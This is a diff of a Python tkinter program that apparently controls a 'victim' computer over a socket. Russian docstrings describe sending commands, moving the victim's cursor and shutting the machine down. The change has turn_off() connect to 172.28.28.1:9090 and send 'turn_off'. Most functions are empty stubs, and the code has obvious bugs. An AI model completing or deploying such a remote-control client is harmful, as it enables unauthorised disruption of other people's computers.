@@ -2,7 +2,6 @@
 from tkinter import *
 import socket
 
-sock = socket.socket()
 # цвета
 colors = {
     'black_blue': (0, 0, 51),
@@ -15,36 +14,28 @@ colors = {
 
 def send_command():
     """
-    берёт данные из поля ввода и отправляет их как команду комьютеру жертвы
+    берёт данные из поля ввода и отправляет их как команду компьютеру жертвы
     :return: возвращает True в случае успеха возвращает False при ошибке отправки данных
     """
     pass
-
-
 def kursor():
     """
     переносит курсор в левый верхний угол экрана
     :return: возвращает True в случае успеха возвращает False при ошибке отправки данных
     """
     pass
-
-
 def turn_off():
     """
     выключает компьютер
     :return: возвращает True в случае отправки данных
     :return: возвращает False при ошибке отправки данных
     """
-    sock.send('hello, world!')
+    sock = socket.socket()
+    sock.connect(('172.28.28.1', 9090))
+    sock.send('turn_off')
 
     data = sock.recv(1024)
     sock.close()
-
-    print(data)
-
-
-def connect():
-    sock.connect(('localhost', 9090))
 
 
 window = Tk()
@@ -60,7 +51,6 @@ btn = Button(window, text="переместить курсор в шабаны",
 btn.grid(column=0, row=2)
 btn = Button(window, text="вырубить комп", fg='WHiTE', bg='BLACK', font=("Arial", 30), command=turn_off())
 btn.grid(column=1, row=2)
-btn = Button(window, text="Подключиться", fg='WHiTE', bg='BLACK', font=("Arial", 30), command=connect())
-btn.grid(column=1, row=2)
+
 
 window.mainloop()
